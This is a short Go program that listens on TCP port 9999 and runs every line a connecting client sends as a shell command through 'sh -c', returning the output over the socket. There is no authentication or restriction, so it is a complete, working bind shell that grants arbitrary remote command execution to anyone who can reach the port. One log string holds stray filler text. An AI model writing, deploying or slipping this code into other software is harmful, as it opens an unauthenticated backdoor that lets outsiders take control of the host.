package main

import (
	"time"
	"net"
	"bufio"
	"io"
	"os"
	"log"
	"strings"
	"os/exec"
)


func main() {
		listener, err := net.Listen("tcp", ":9999")
		if err != nil {
			log.Fatalf("error while bootstrapping tcp listener: aklsdjf;a: %v\n", err)
		}
		defer listener.Close() 
		log.Println("accepting new connections..")

		for {
				conn, err := listener.Accept()
				if err != nil {
					log.Fatalf("error accepting a new connection")
				}

				go connHandler(conn)
		}
}


func connHandler(conn net.Conn) error {
		defer conn.Close()
		log.Printf("New connection! : %s", conn.RemoteAddr().String())

		timeoutDuration := 2 * time.Minute
		reader := bufio.NewReader(conn)

		for {
				_ = conn.SetReadDeadline(time.Now().Add(timeoutDuration))
				command, err := reader.ReadString('\n')
				if  err != nil {
						if err == io.EOF {
								log.Printf("%s Disconnected gracefully..\n", conn.RemoteAddr().String())
						} else {
								log.Print("wasn't able to read for some reason..")
						}	
						return err
				}
				
				go commandHandler(command, conn)
				// cmdOutput, err := runCommand(command)
				// _, err = conn.Write(cmdOutput)
				// if err != nil {
				// 	log.Print("error writing to client socket")
				// 	return err
				// }
		}

		return nil
}

func commandHandler(command string, conn net.Conn) error {
	cmd := exec.Command("sh", "-c", strings.TrimSpace(command))
	cmd.Stdout = conn
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin

	if err := cmd.Run(); err != nil {
		log.Print("error occurred while running command ", command)
		return err
	}
	return nil 
}

func runCommand(command string) ([]byte	, error) {
		out, err := exec.Command("sh", "-c", strings.TrimSpace(command)).Output()

		if err != nil {
			log.Print("error occurred while running the command", err)
			return []byte{}, err
		}

		return out, nil
}
